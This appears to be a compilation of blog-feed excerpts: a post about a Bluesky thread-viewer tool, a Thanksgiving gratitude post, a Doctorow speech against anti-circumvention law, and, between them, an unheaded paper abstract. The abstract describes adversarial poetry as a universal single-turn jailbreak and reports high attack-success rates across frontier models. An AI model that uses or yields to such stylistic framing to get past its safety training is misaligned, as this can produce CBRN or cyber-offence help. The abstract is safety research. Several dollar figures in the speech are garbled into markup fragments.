<p><img src="https://static.simonwillison.net/static/2025/bluesky-thread-viewer-demo.gif" alt="This short animated GIF demo starts with the Thread by @simonwillison.net page where a URL to a Bluesky post has been entered and a Fetch Thread button clicked. The thread is shown as a nested collection of replies. A &quot;Hide other replies&quot; button hides the replies revealing just the top-level self-replies by the original author - and turns into a &quot;Show 11 other replies&quot; button when toggled. There are tabs for Thread View and Most Recent First - the latter when clicked shows a linear list of posts with the most recent at the top. There are &quot;Copy&quot; and Copy JSON&quot; green buttons at the top of the page."></p>
<p>I've been mostly vibe-coding this thing since April, now spanning <a href="https://github.com/simonw/tools/commits/main/bluesky-thread.html">15 commits</a> with contributions from ChatGPT, Claude, Claude Code for Web and Claude Code on my laptop. Each of those commits links to the transcript that created the changes in the commit.</p>
<p>Bluesky is a <em>lot</em> of fun to build tools like this against because the API supports CORS (so you can talk to it from an HTML+JavaScript page hosted anywhere) and doesn't require authentication.</p>

<p><strong>Abstract</strong>: We present evidence that adversarial poetry functions as a universal single-turn jailbreak technique for Large Language Models (LLMs). Across 25 frontier proprietary and open-weight models, curated poetic prompts yielded high attack-success rates (ASR), with some providers exceeding 90%. Mapping prompts to MLCommons and EU CoP risk taxonomies shows that poetic attacks transfer across CBRN, manipulation, cyber-offence, and loss-of-control domains. Converting 1,200 ML-Commons harmful prompts into verse via a standardized meta-prompt produced ASRs up to 18 times higher than their prose baselines. Outputs are evaluated using an ensemble of 3 open-weight LLM judges, whose binary safety assessments were validated on a stratified human-labeled subset. Poetic framing achieved an average jailbreak success rate of 62% for hand-crafted poems and approximately 43% for meta-prompt conversions (compared to non-poetic baselines), substantially outperforming non-poetic baselines and revealing a systematic vulnerability across model families and safety training approaches. These findings demonstrate that stylistic variation alone can circumvent contemporary safety mechanisms, suggesting fundamental limitations in current alignment methods and evaluation protocols...</p>

      <h1>Thanksgiving gratitude</h1>

(date: 2025-11-28)
      <p>
      <p>Happy belated Thanksgiving. I was so busy yesterday, didn't have the time to do my usual Thanksgiving gratitude post. And I do have a few things to be thankful for this year.</p>
<p>First I want to thank all the non-technical peoople who read this blog <a href="https://subscribe.scripting.com/">every day</a>. This has been one of the very nicest things about writing this blog, going back to 1994, there have been quite a few people who skim the technical posts, of which there have been many these days, as I am preparing to try to shake up the world of discourse on the net, hoping to get it back on the track it was on before the silos came along and monetized us. Ultimately, if it happens, we will all benefit, techies and non-techies alike.</p>
<p>I thank you all for your patience and indulgence.</p>
<p>Most of the non-tech readers I hear from are women, btw. My mother for example was a regular reader. For whatever reason, pleasing women is about 1,000,000 times more important to me than pleasing men. Possibly because I had a gutsy mother who programmed me that way. Almost nothing makes me happier.</p>
<p>Another thing that makes me unreasonably happy is to be back in touch with most of the developers who worked with me at UserLand on Frontier. Starting wtih Jake Savin, and then André Radke, Brent Simmons and Wes Felter. And esp with Brent, who went on to write NetNewsWire, the hugely popular feed reader for Mac OS. This means so much to me. I spent years bouncing ideas off Brent and listening to what he said very carefully. I also strived to pass on through each of them my values of software, computer networks, and our responsibilities to users. Each of them are different, have different strengths, but they are all lovely human beings. Reconnecting this year wasn't in any way a goal of mine, it just happened that way.</p>
<p>Another thing that makes me absolutely optimistic about the future is to discover the compatibility between the vision of the web that I shared with many of the early web developers, again going back to 1994 and the following years, and today's developers of WordPress. We occupy different spaces in tech, I'm a web developer who works in JavaScript in the browser and Node.js, and they work in PHP and their own platform, but as I opined <a href="http://scripting.com/2025/11/27/145439.html">yesterday</a>, you can use the web to connect all flavors of things, by design. I used the criticism that Mastodon and WordPress are like <a href="https://simple.wikipedia.org/wiki/Apples_and_oranges">apples and oranges</a>, an American idiom that usually connotes incompatibility, but on the web, you <em>can</em> connect apples and oranges. Differences are negotiable, you have to remember that -- and taking advantage of the web that way is what it was created for. Like the internet it was built on, the web makes it possible for very different things to work together, and in doing so makes it possible for <em>people</em> to work together too.</p>
<p>I know I've thanked him before, but it's worth doing again -- thanks to <a href="https://en.wikipedia.org/wiki/Tim_Berners-Lee">Tim Berners-Lee</a> for his very timely invention of the web, which set users and developers everywhere free, only to have the siloers re-emerge fourteen years after its advent to give power back to the bankers, with the predictable, disastrous results. Our political system suffered a massive virtual oil spill thanks to Twitter, which we have yet to begin to clean up. As a result health care is in a very precarious state. It has been used as an instrument of war. Who could have imagined that a cutely-named system like Twitter could do all that damage, but it did.</p>
<p>TBL gave us a taste of freedom. Many of the WordPress community leaders are too young to have had that taste, but they still believe in it. And that's probably the most important thing to be thankful for. And maybe it's not the only tech community that has that inspiration at its core. And maybe that feeling extends beyond tech?</p>
<p>We build bubbles to contain us, to make the communities we're part of smaller and thus more manageable. But if we do it right, we can be part of the Macintosh world and the WordPress world, and build the proper interfaces to our work so we're also part of the web. That's where the magic comes from. The unforseen connections that &quot;just work&quot; the first time. That's where I've chosen to work as I approach the end of my career -- on the intersections that route around the silos and return the power of the web to the people.</p>
<p>BTW, maybe this idea can connect to the story of AOC, Bernie Sanders and Heather Cox Richardson, three of my current-day examples for how we can use communication to get back on track to a world with purpose and a heart.</p>

      <p>
      <p>Today's links (Digital) Elbows Up: How Canada Can Become a Nation of Jailbreakers, Reclaim Our Digital Sovereignty, Win the Trade-War, and Disenshittify Our Technology. Hey look at this: Delights to delectate.

Recent appearances: Where I've been. Latest books: You keep readin' em, I'll keep writin' 'em. Upcoming books: Like I said, I'll keep writin' 'em. Colophon: All the rest. (Digital) Elbows Up (permalink) I'm in Toronto to participate in a three-day &quot;speculative design&quot; workshop at OCAD U, where designers, technologists and art students are thinking up cool things Canadians could do if we reformed our tech law: <a href="https://www.ocadu.ca/events-and-exhibitions/jailbreaking-canada">https://www.ocadu.ca/events-and-exhibitions/jailbreaking-canada</a> As part of that workshop, I delivered a keynote speech last night, entitled &quot;(Digital) Elbows Up: How Canada Can Become a Nation of Jailbreakers, Reclaim Our Digital Sovereignty, Win the Trade-War, and Disenshittify Our Technology.&quot; The talk was recorded and I'll add the video to this post when I get it, but in the meantime, here's the transcript of my speech. Thank you to all my collaborators at OCAD U for bringing me in and giving me this wonderful opportunity! == My theory of enshittification describes the process by which platforms decay. First, they are good to their end users, while finding a way to lock those users in. Then, secure in the knowledge that they can make things worse for those users without risking their departure, the platforms make things worse in order to make things attractive for business customers. Who also get locked in, dependent on those captive users. And then, in the third stage of enshittification, platforms raid those business customers, harvesting all available surpluses for their shareholders and executives, leaving behind the bare, mingy homeopathic residue of value needed to keep users locked to the platform and businesses locked to the users, such that the final, ideal stage of the enshittified platform is attained: a giant pile of shit. This observational piece of the theory is certainly valuable, inasumuch as it lets us scoop up this big, diffuse, enraging phenomenon, capture it in a net, attach a handle to it and call it &quot;enshittification,&quot; recognising how we're being screwed. But much more important is the enshittification hypothesis's theoretical piece, its account of why this is happening now. Let me start by saying that I do not attribute blame for enshittification to your poor consumer choices. Despite the endless insistences of the right, your consumption choices aren't the arbiters of policy. The reason billionaires urge you to vote with your wallets is that their wallets are so much thicker than yours. This is the only numeric advantage the wealthy and powerful enjoy. They are in every other regards an irrelevant, infinitesimal minority. In a vote of ballots, rather than wallets, they will lose every time, which is why they are so committed to this wallet-voting nonsense. The wallet-vote is the only vote they can hope to win. The idea that consumers are the final arbiters of society is a laughable, bitter counsel of despair. You will not shop your way free of a monopoly, any more than you will recycle your way out of wildfires. Shop as hard as you like, you will not – cannot – end enshittification. Enshittification is not the result of your failure to grasp that &quot;if you're not paying for the product, you're the product.&quot; You're the product if you pay. You're the product if you don't pay. The determinant of your demotion to &quot;the product&quot; is whether the company can get away with treating you as the product. So what about the companies? What about the ketamine-addled zuckermuskian failures who have appointed themselves eternal dictators over the digital lives of billions of people? Can we blame them for enshittifying our world? Well, yes…and no. It's obviously true that it takes a certain kind of sociopath to run a company like Facebook or Google or Apple. The suicide nets around Chinese iPhone factories are a choice, not an integral component of the phone manufacturing process. But these awful men are merely filling the niches that our policy environment has created. If Elon Musk ODs on ket today, there will be an overnight succession battle among ten horrible Big Balls, and the victor who emerges from that war will be indistinguishable from Musk himself. The problem isn't that the wrong person is running Facebook and thus exercising a total veto over the digital lives of four billion people, the problem is that such a job exists. We don't need to perfect Zuck. We don't need to replace Zuck. We need to abolish Zuck. So where does the blame lie? It lies with policy makers. Regulators and politicians who created an enshittogenic environment: a rigged game whose terrible rules guarantee that the worst people doing the worst things will fare best. These are the true authors of enshittification: the named individuals who, in living memory, undertook specific policy decisions, that had the foreseeable and foreseen outcome of ushering in the enshittocene. Policymakers who were warned at the time that this would happen, who ignored that advice and did it anyway. It is these people and their terrible, deliberate misconduct that we need to remember. It is their awful policies that we must overthrow, otherwise all we can hope to do is replace one monster with another. So, in that spirit, let us turn to the story of one of these enshittogenic policy choices and the men who made it. This policy is called &quot;anti-circumvention&quot; and it is the epicenter of the enshittogenic policy universe. Under anti-circumvention law, it is a crime to modify a device that you own, if the company that sold it to you would prefer that you didn't. All a company has to do is demarcate some of its code as off-limits to modification, by adding something called an &quot;access control,&quot; and, in so doing, they transform the act of changing any of that code into a felony, a jailable offense. The first anticircumvention law is America's Digital Millennium Copyright Act, or DMCA. Under Section 1201 of the DMCA, helping someone modify code behind an access control is a serious crime, punishable by a five-year prison sentence and a <span class="math inline">\(500,000 fine. Crucially, this is true whether or not you break any other law. Under DMCA 1201, simply altering a digital device to do a perfectly legal thing becomes a jailable crime, if the manufacturer wills it so and manifests that will with an "access control." I recognize that this is all very abstract, so let me make it concrete. When you buy a printer from HP, it becomes your property. What's property? Well, let's use the standard definition that every law student learns in first year property law, from Sir William Blackstone's 1753 treatise: "Property: that sole and despotic dominion which one man claims and exercises over the external things of the world, in total exclusion of the right of any other individual in the universe." The printer is yours. It's your property. You have sole and despotic dominion over it in exclusion of any other individual in the universe. But HP printers ship with a program that checks to see whether you're using HP ink, and if it suspects that you've bought generic ink, the printer refuses to use it. Now, Congress never passed a law saying "If you buy an HP printer, you have to buy HP ink, too." That would be a weird law, given the whole sole-and-despotic dominion thing. But because HP puts an "access control" in the ink-checking code, they can conjure up a brand new law: a law that effectively requires you to use HP ink. Anticircumvention is a way for legislatures to outsource law-making to corporations. Once a corporation adds an access control to its product, they can create a new felony for using it in ways that benefit you at the expense of the company's shareholders. So another way of saying "anticircumvention law" is "felony contempt of business model." It's a way for a corporation to threaten you with prison if you don't use your property in the way they want you to. That's anti-circumvention law. The DMCA was an enshittifier's charter, an invitation for corporations to use tactical "access controls" to write invisible, private laws that would let them threaten their customers – and competitors who might help those customers – with criminal prosecution. Now, the DMCA has a known, living author, Bruce Lehman, a corporate IP lawyer who did a turn in government service as Bill Clinton's IP Czar. Lehman tried several ways to get American policymakers to adopt this stupid idea, only to be rebuffed. So, undaunted, he traveled to Geneva, home of the World Intellectual Property Organization or WIPO, a UN "specialized agency" that makes the world's IP treaties. At Lehman's insistence, WIPO passed a pair of treaties in 1996, collectively known as the "Internet Treaties," and in 1998, he got Congress to pass the DMCA, in order to comply with the terms of these treaties, a move he has since repeatedly described as "doing an end-run around Congress." This guy, Bruce Lehman, is still with us, breathing the same air as you and me. We are sharing a planet with the Louis Pasteur of making everything as shitty as possible. But Bruce Lehman only enshittified America, turning our southern cousins into fodder for the immortal colony organisms we call limited liability corporations. To understand how Canada enshittified, we have to introduce some Canadian enshittifiers. Specifically, two of Stephen Harper's ministers: James Moore, Harper's Heritage minister, and the disgraced sex-pest Tony Clement, who was then Industry minister. Stephen Harper really wanted a Canadian anti-circumvention law, and he put Clement and Moore in charge of the effort. Everyone knew that it was going to be a hard slog. After all, Canadians had already rejected anti-circumvention law three times. Back in 2006, Sam Bulte – a Liberal MP in Paul Martin's government – tried to get this law through, but it was so unpopular that she lost her seat in Parkdale, which flipped to the NDP for a generation. Moore and Clement hatched a plan to sell anti-circumvention to the Canadian people. They decided to do a consultation on the law. The thinking was that if we all "felt heard" then we wouldn't be so angry when they rammed it through. Boy, did that backfire. 6,138 of us filed consultation responses categorically rejecting this terrible law, and only 53 responses offered support for the idea. How were Moore and Clement going to spin this? Simple. Moore went to a meeting of the International Chamber of Commerce in Toronto, and gave a speech where he denounced all 6,138 of us as "babyish" and "radical extremists." Then Harper whipped his caucus and in 2012, Bill C-11, the Copyright Modernisation Act passed, and we got a Made-in-Canada all-purpose, omnienshittificatory anti-circumvention law. Let's be clear about what this law does: because it makes no exemptions for circumvention for lawful purposes, Canada's anti-circumvention law criminalizes anything you do with your computer, phone or device, if it runs counter to the manufacturer's wishes. It's an invitation for foreign manufacturers to use Canada's courts to punish Canadian customers and Canadian companies for finding ways to make the products we buy and use less shitty. Anti-circumvention is at the root of the repair emergency. All companies have to do is add an "initialization" routine to their devices, so that any new parts installed in a car, or a tractor, or a phone, or a ventilator have to be unlocked by the manufacturer's representative before the device will recognize the new part, and it becomes a crime for an independent mechanic, or a farmer, or an independent repair shop, or a hospital technician to fix a car, or a tractor, or a phone, or a ventilator. This is called "parts pairing" or "VIN locking." Now, we did pass C-244, a national Right to Repair law, last year, but it's just a useless ornament, because it doesn't override anti-circumvention. So Canadians can't fix their own technology if the manufacturer uses an access control to block the repair. Anti-circumvention means we can't fix things when they break, and it also means that we can't fix them when they arrive pre-broken by their enshittifying manufacturers. Take the iPhone: it can only use one app store, Apple's official one, and everyone who puts an app in the app store has to sign up to use Apple's payment processor, which takes 30 cents out of every dollar you spend inside an app. That means that when a Canadian user sends \)</span>10 a month to a Canadian independent news outlet or podcast, <span class="math inline">\(3 out of that \)</span>10 gets sucked out of the transaction and lands in Cupertino, California, where it is divvied by Apple's shareholders and executives. It's not just news sites. Every dollar you send through an app to a performer on Patreon, a crafter on Etsy, a games company, or a software company takes a roundtrip through Silicon Valley and comes back 30 cents lighter. A Canadian company could bypass the iPhone's &quot;access controls&quot; and give you a download or a little hardware dongle that installed a Canadian app store, one that used the Interac network to process payments for free, eliminating Apple and Google's 30% tax on Canada's entire mobile digital economy. And indeed, we have 2024's Bill C-294, an interoperability law, that lets Canadians do this. But just as with the repair law, our interoperability law is also useless, because it doesn't repeal the anti-circumvention law, meaning you are only allowed to reverse engineer products to make interoperable alternatives if there is no access control in the way. Of course, every company that's in a position to rip you off just adds an access control. The fact that foreign corporations have the final say over how Canadians use their own property is a font of endless enshittification. Remember when we told Facebook to pay news outlets for links and Facebook just removed all links to the news? Our anti-circumvention law is the only reason that a Canadian company couldn't jailbreak the Facebook app and give you an alternative app, one that slurped up everything Facebook was waiting to show you in your feed, all the updates from your friend and your groups while blocking all the surveillance, the ads and the slop and the recommendations, and then mixing in the news that you wanted to see. Remember when we tried to get Netflix to show Canadian content in your recommendations and search results? Anti-circumvention is the only reason some Canadian company can't jailbreak the Netflix app and give you an alternative client that lets you stream all your Netflix shows but also shows you search results from the NFB and any other library of Canadian media, while blocking Netflix's surveillance. Anticircumvention means that Canadian technologists can't seize the means of computation, which means that we're at the mercy of American companies and we only get the rights that they decide to give us. Apple will block Facebook's apps from spying on you while you use your iPhone, but they won't let you block Apple from spying on you while you use your iPhone, to gather exactly the same data Facebook steals from you, for exactly the same purpose: to target ads to you. Apple will screen the apps in its app store to prevent malicious code from running on your iPhone, but if you want to run a legitimate app and Apple doesn't want you to, they will block it from the app store and you will just have to die mad. That's what's happened in October, when Apple kicked an app called ICE Block out of the App Store. ICE Block is an app that warns you if masked thugs are at large in your neighborhood waiting to kidnap you and send you to a camp. Apple decided that ICE thugs were a &quot;protected class&quot; that ICE Block discriminated against. They decided that you don't deserve to be safe from ICE kidnappings, and what they say goes. The road to enshittification hell is paved with anticircumvention. We told our politicians this, a decade and a half ago, and they called us &quot;babyish radical extremists&quot; and did it anyway. Now, I've been shouting about this for decades. I was one of those activists who helped get Sam Bulte unelected and flipped her seat for 20 years. But I will be the first person to tell you that I have mostly failed at preventing enshittification. Bruce Lehman, James Moore and even Tony &quot;dick pic&quot; Clement are way better at enshittifying the world than I am at disenshittifying it. Of course, they have an advantage over me: they are in a coalition with the world's most powerful corporations and their wealthy investors. Whereas my coalition is basically, you know, you folks. People who care about human rights, workers' rights, consumer rights, privacy rights. And guys, I hate to tell you, but we're losing. Let's talk about how we start winning. Any time you see a group of people successfully push for a change that they've been trying to make unsuccessfully for a long-ass time it's a sure bet that they've found some coalition partners. People who want some of the same things, who've set aside their differences and joined the fight. That's the Trump story, all over. The Trump coalition is basically, all the billionaires, plus the racists, plus the dopes who'd vote for a slime mold if it promised to lower their taxes by a nickle, even though they somehow expect to have roads and schools. Well, maybe not schools. You know, Ford Nation. Plus everyone who correctly thinks the Democratic Party are a bunch of do-nothing sellouts, who think they can bully you into voting for genocide because the other guy is an out-and-out fascist. Billionaires, racists, freaks with low-tax brain-worms and people who hate the sellout Dems: Trump's built a coalition that gets stuff done. Sure, it's terrible stuff, but you can't deny that they're getting it done. To escape from the enshittificatory black hole that Clement and Moore blew in Canadian policy, we need a coalition, too. And thanks to Trump and his incontinent belligerence, we're getting one. Let's start with the Trump tariffs. When I was telling you about how anticircumvention law took four tries under two different Prime Ministers, perhaps you wondered &quot;Why did all these Canadian politicians want this stupid law in the first place?&quot; After all, it's not like Canadian companies are particularly enriched by this law. Sure, it lets Ted Rogers rent you a cable box that won't let you attach a video recorder, so you have to pay for Rogers' PVR, which only lets you record some shows, and deletes them after a set time, and won't let you skip the ads. But the amount of extra money Rogers makes off this disgusting little racket is dwarfed by the billions that Canadian businesses leave on the table every year, by not going into business disenshittifying America's shitty tech exports. To say nothing of the junk fees and app taxes and data that those American companies rip off every Canadian for. So why were these Canadian MPs and prime ministers from both the Liberals and the Tories so invested in getting anticircumvention onto our law-books? Simple: the US Trade Rep threatened us with tariffs if we didn't pass an anti-circuvmention law. Remember, digital products are slippery. If America bans circumvention, and American companies start screwing the American public, that just opens an opportunity for companies elsewhere in the world to make disenshittifying products, which any American with an internet connection and a payment method can buy. Downloading jailbreaking code is much easier than getting insulin shipped from a Canadian pharmacy! So the US Trade Rep's top priority for the past quarter-century has been bullying America's trading partners into passing anti-circumvention laws to render their own people defenseless against American tech companies' predation and to prevent non-American tech companies from going into business disenshittifying America's defective goods. The threat of tariffs was so serious that multiple Canadian PMs from multiple parties tried multiple times to get a law on the books that would protect us from tariffs. And then in comes Trump, and now we have tariffs anyway. And let me tell you: when someone threatens to burn your house down if you don't follow their orders, and you follow their orders, and they burn your house down anyway, you are an absolute sucker if you keep following their orders. We could respond to the tariffs by legalizing circumvention, and unleashing Canadian companies to go into business raiding the margins of the most profitable lines of business of the most profitable corporations the world has ever seen. Sure, Canada might not ever have a company like Research In Motion again, but what we could have is a company that sells the tools to jailbreak iPhones to anyone who wants to set up an independent iPhone store, bypassing Apple's 30% app tax and its high-handed judgments about what apps we can and can't have. Apple's payment processing business is worth <span class="math inline">\(100b/year. We could offer people a 90% discount and still make \)</span>10b/year. And unlike Apple, we wouldn't have to assume the risk and capital expenditure of making phones. We could stick Apple with all of the risk and expense, and cream off the profits. That's fair, isn't it? It's certainly how Big Tech operates. When Amazon started, Jeff Bezos said to the publishers, &quot;Your margin is my opportunity.&quot; <span class="math inline">\(100b/year off a 30% payment processing fee is a hell of a margin, and a hell of an opportunity. With Silicon Valley, it's always "disruption for thee, not for me." When they do it to us, that's progress, when we do it to them, it's piracy (and every pirate wants to be an admiral). Now, of course, Canada hasn't responded to the Trump tariffs with jailbreaking. Our version of "elbows up" turns out to mean retaliatory tariffs. Which is to say, we're making everything we buy from America more expensive for us, which is a pretty weird way of punishing America, eh? It's like punching yourself in the face really hard and hoping the downstairs neighbour says "Ouch." Plus, it's pretty indiscriminate. We're not angry at Americans. We're angry at Trump and his financial backers. Tariffing soybeans just whacks some poor farmer in a state that begins and ends with a vowel who's never done anything bad to Canada. I guarantee you that poor bastard is making payments on a John Deere tractor, which costs him an extra \)</span>200 every time it breaks down, because after he fixes it himself, he has to pay two hundred bucks to John Deere and wait two days for them to send out a technician who types an unlock code into the tractor's console that unlocks the &quot;parts pairing,&quot; so the tractor recognises the new part. Instead of tariffing that farmer's soybeans, we could sell him the jailbreaking tool that lets him fix his tractor without paying an extra <span class="math inline">\(200 to John Deere. Instead of tsking at Elon Musk over his Nazi salute, we could sell every mechanic in the world a Tesla jailbreaking kit that unlocks all the subscription features and software upgrades, without sending a dime to Tesla, kicking Elon Musk square in the dongle. This is all stuff we could be doing. We could be building gigantic Canadian tech businesses, exporting to a global market, whose products make everything cheaper for every Canadian, and everyone else in the world, including every American. Because the American public is also getting screwed by these companies, and we could stand on guard for them, too. We could be the Disenshittification Nation. But that's not what we've done. Instead, we've decided to make everything in Canada more expensive, which is just about the stupidest political strategy I've ever heard of. This might be the only thing Carney could do that's less popular than firing 10,000 civil servants and replacing them with chatbots on the advice of the world's shadiest art dealer, who is pretty sure that if we keep shoveling words into the word-guessing program it will wake up and become intelligent. Which is just, you know, stupid. It's like thinking that if we just keep breeding our horses to run faster, one of our mares will eventually give birth to a locomotive. Human beings are not word-guessing programs who know more words than ChatGPT. Now, it's clear that the coalition of "people who care about digital rights" and "people who want to make billions of dollars off jailbreaking tech" isn't powerful enough to break the coalition that makes hundreds of billions of dollars from enshittification. But Trump – yes, Trump! – keeps recruiting people to our cause. Trump has made it clear that America no longer has allies, nor does it have trading partners. It has adversaries and rivals. And Trump's favorite weapons for attacking his foreign adversaries are America's tech giants. When the International Criminal Court issued an arrest warrant against Bejamin Netanyahu for ordering a genocide, Trump denounced them, and Microsoft shut down their Outlook accounts. The chief prosecutor and other justices immediately lost access to all the working files of the court, to their email archives, to their diaries and address books. This was a giant, blinking sign, visible from space, reading AMERICAN TECHNOLOGY CANNOT BE TRUSTED. Trump's America only has adversaries and rivals, and Trump will pursue dominance by bricking your government, your businesses, your whole country. It's not just administrative software that Trump can send kill signals to. Remember when those Russian looters stole Ukrainian tractors and they turned up in Crimea? John Deere sent a kill-signal to the tractors and permanently immobilized them. This was quite a cool little comeuppance, the kind of thing a cyberpunk writer like me can certainly relish. But anyone who thinks about this for, oh, ten seconds will immediately realise that anyone who can push around the John Deere company can order the permanent immobilization of any tractor in the world, or all the tractors in your country. Because John Deere is a monopolist, and whatever part of the market Deere doesn't control is controlled by Massey Ferguson, and Trump can order the bricking of those tractors, too. This is the thing we were warned we'd face if we let Huawei provide our telecoms infrastructure, and those warnings weren't wrong. We should be worried about any gadget that we rely on that can be bricked by its manufacturer. Because that means we are at risk from the manufacturer, from governments who can suborn the manufacturer, from corporate insiders who can hijack the manufacturer's control systems, and from criminals who can impersonate the manufacturer to our devices. This is the third part of our coalition: not just digital rights weirdos like me; not just investors and technologists looking to make billions; but also national security hawks who are justifiably freaking out about America, China, or someone else shutting down key pieces of their country, from its food supply to its administrative capacity. Trump is a crisis, and crises precipitate change. Just look at Europe. Before Putin invaded Ukraine, the EU was a decade behind on its energy transition goals. Now, just a few years later, they're 15 years ahead of schedule. It turns out that a lot of "impossible" things are really just fights you'd rather not have. No one wants to argue with some tedious German who hates the idea of looking at "ugly solar panels" on their neighbour's balcony. But once you're all shivering in the dark, that's an argument you will have and you will win. Today, another mad emperor is threatening Europe – and the world. Trump's wanton aggression has given rise to a new anti-enshittification coalition: digital rights advocates, investors and technologists, and national security hawks; both the ones who worry about America, and the ones who worry about China. That's a hell of a coalition! The time is right to become a disenshittification nation, to harness our own tech talent, and the technologists who are fleeing Trump's America in droves, along with capital from investors who'd like to back a business whose success isn't determined by how many \)</span>TRUMP Coins they buy. Jailbreaking is how Canada cuts American Big Tech down to size. It's unlike everything else we've tried, like the Digital Services Tax, or forcing Netflix to support cancon, or making Facebook and Google pay to link to the news. All of those tactics involve making these companies that are orders of magnitude richer than Canada do something they absolutely do not want to do. Time and again, they've shown that we don't have the power to make them do things. But you know what Canada has total power over? What Canada does. We are under no obligation to continue to let these companies use our courts to attack our technologists, our businesses, our security researchers, our tech co-ops, our nonprofits, who want to jailbreak America's shitty tech, to seize the means of computation, to end the era in which American tech companies can raid our wallets and our data with impunity. In a jailbroken Canada, we don't have to limit ourselves to redistribution, to taxing away some of the money that the tech giants steal from us. In a jailbroken Canada, we can do predistribution. We can stop them from stealing our money in the first place. And if we don't do it, someone else will. Because every country was arm-twisted into passing an anti-circumvention law like ours. Every country had a supine and cowardly lickspittle like James Moore or Tony Clement who'd do America's bidding, a quisling who'd put their nation's people and businesses in chains, rather than upset the US Trade Rep. And all of those countries are right where we are: hit with tariffs, threatened by Trump, waiting for the day that Microsoft or Oracle or Google or John Deere bricks their businesses, their government, their farms. One of those countries is going to jump at this opportunity, the opportunity to consume the billions in rents stolen by US Tech giants, and use them as fuel for a single-use rocket booster that launches their tech sector into a stable orbit for decades to come. That gives them the hottest export business in living memory: a capital-light, unstoppable suite of products that save businesses and consumers money, while protecting their privacy. If we sleep on this, we'll still benefit. We'll get the consumer surplus that comes from buying those jailbreaking tools online and using them to disenshittify our social media, our operating systems, our vehicles, our industrial and farm equipment. But we won't get the industrial policy, the chance to launch a whole sector of businesses, each with the global reach and influence of RIM or Nortel. That'll go to someone else. The Europeans are already on it. They're funding and building the &quot;Eurostack&quot;: free, open source, auditable and trustworthy versions of the US tech silos. We're going to be able to use that here. I mean, why not? We'll just install that code on metal running in Canadian data-centres, and we'll debug it and add features to it, and so will everyone else. Because that's how IT should work, and it should go beyond just the admin and database software that businesses and governments rely on. We should be building drop-in, free, open software for everything: smart speakers, smart TVs, smart watches, phones, cars, tractors, powered wheelchairs, ventilators. That's how it should already be: that the software that powers these devices that we entrust with our data, our integrity, our lives should be running code that anyone can see, test, and improve. That's how science works, after all. Before we had science, we had something kind of like science. We had alchemy. Alchemy was very similar to science, in that an alchemist would observe some natural phenomena in the world, hypothesise a causal relationship between them, and design an experiment to validate that hypothesis. But here's where alchemy and science diverge: unlike a scientist, an alchemist wouldn't publish their results. They'd keep them secret, rather than exposing them to the agony of adversarial peer review, where your enemies seek out every possible reason to discredit your work. This let the alchemists kid themselves about the stuff they thought they'd discovered, and that's why every alchemist discovered for themself, in the hardest way possible, that you shouldn't drink mercury. But after 500 years of this, alchemy finally achieved its long sought-after goal of converting something common to something of immeasurable value. Alchemy discovered how to transform the base metal of superstition into the precious metal of knowledge, through the crucible of publishing. Disclosure is the difference between knowledge and ignorance. Openness is the difference between dying of mercury poisoning and discovering medicine. The fact that we have a law on our statute books, in the year of two thousand and twenty-five, that criminalises discovering how the software we rely on works, and telling other people about it and improving it – well, it's pretty fucking pathetic, isn't it? We don't have to keep on drinking the alchemists' mercury. We don't have to remain prisoners of the preposterous policy blunders of Tony Clement and James Moore. We don't have to tolerate the endless extraction of Big Tech. We don't have to leave billions on the table. We need not abide the presence of lurking danger in all our cloud-connected devices. We can be the vanguard of a global movement of international nationalism, of digital sovereignty grounded in universal, open, transparent software, a commons that everyone contributes to and relies upon. Something more like science than technology. Like the EU's energy transition, this is a move that's long overdue. Like the EU's energy transition, a mad emperor has created the conditions for us to get off of our asses, to build a better world. We could be a disenshittification nation. We could seize the means of computation. We could have a new, good internet that respects our privacy and our wallets. We could make a goddamned fortune doing it. And once we do it, we could protect ourselves from spineless digital vassals of the mad king on our southern border, and rescue our American cousins to boot. What's not to like?
